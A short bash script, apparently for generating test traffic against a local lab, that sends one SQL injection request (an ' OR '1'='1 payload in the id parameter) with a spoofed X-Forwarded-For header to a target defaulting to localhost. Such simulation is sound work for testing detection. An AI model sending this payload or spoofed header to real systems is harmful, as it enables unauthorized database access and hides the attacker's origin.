#!/bin/bash

TARGET=${TARGET:-http://localhost:8080}

echo "[*] Simulating SQL Injection..."

curl -s -H "X-Forwarded-For: 77.77.77.77" "$TARGET/index.php?id=1%27%20OR%20%271%27=%271" > /dev/null

echo "[*] Finished simulating SQL Injection"